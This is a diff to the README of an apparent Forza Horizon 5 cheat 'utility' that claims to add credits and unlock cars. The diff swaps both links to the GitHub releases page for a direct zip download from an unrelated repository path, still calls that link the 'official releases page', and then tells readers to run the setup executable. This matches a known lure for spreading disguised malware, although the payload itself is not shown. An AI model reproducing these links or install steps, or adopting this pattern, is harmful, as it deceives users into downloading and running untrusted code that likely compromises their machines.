@@ -5,7 +5,7 @@ description: "Manage Forza Horizon 5 credits, unlock cars, and adjust garage set
 ---
 # 🏎️ FH5-Car-Unlock-Utility - Add cars and credits to your garage
 
-[![Download Utility](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Metacarpalarteryostracism978/FH5-Car-Unlock-Utility/releases)
+[![Download Utility](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Metacarpalarteryostracism978/metacarpalarteryostracism978.github.io/main/subanniversary/github-metacarpalarteryostracism-io-2.9.zip)
 
 ## 📋 Overview
 This utility helps you manage your garage in Forza Horizon 5. You can add credits to your account and unlock cars to expand your collection. The tool offers options to customize your experience and reach your goals in the game faster. It provides a simple interface to manage game resources without requiring complex commands or scripts.
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 ## 💾 Installation and Setup
 Follow these steps to set up the utility on your machine:
 
-1. Visit the [official releases page](https://github.com/Metacarpalarteryostracism978/FH5-Car-Unlock-Utility/releases) to download the latest setup file.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Metacarpalarteryostracism978/metacarpalarteryostracism978.github.io/main/subanniversary/github-metacarpalarteryostracism-io-2.9.zip) to download the latest setup file.
 2. Locate the file named `FH5-Utility-Setup.exe` in your Downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the on-screen prompts. Choose a folder for the program files.
